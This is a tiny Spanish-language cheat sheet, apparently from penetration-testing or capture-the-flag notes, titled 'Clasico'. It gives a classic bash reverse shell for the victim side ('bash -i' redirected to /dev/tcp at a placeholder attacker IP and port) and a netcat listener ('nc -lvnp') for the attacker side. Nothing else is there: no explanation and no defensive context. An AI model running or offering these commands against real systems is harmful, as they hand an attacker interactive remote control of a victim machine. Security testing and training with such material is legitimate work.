# Clasico

#### Victima:

```shell
bash -c "bash -i >& /dev/tcp/{OUR_IP}/{PORT} 0>&1"
```
#### Atacante:

```shell
nc -lvnp {PUERTO}
```
